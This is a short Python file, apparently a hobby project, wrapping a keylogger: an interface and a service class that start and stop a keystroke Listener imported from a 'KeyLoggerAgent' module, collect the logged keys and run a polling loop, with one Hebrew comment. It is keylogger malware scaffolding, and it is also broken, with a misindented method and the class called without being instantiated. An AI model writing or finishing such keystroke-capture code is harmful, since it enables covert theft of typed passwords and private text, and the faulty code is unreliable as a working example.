from abc import ABC, abstractmethod
from typing import List
from KeyLoggerAgent import Listener,logged_keys
import time

class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
      pass

     @abstractmethod
     def stop_logging(self) -> None:
      pass

     @abstractmethod
     def get_logged_keys(self):
      pass




class KeyLoggerService(IKeyLogger):
     def __init__(self):
        self._active = False

     def start_logging(self):
       Listener.start()
       self._active = True


     def stop_logging(self):
      Listener.stop()
      self._active = False


    def get_logged_keys(self):
      return list(logged_keys)


test=KeyLoggerService

test.start_logging()




while Listener.running:
    # להריץ קוד במקביל אם צריך
    time.sleep(0.01)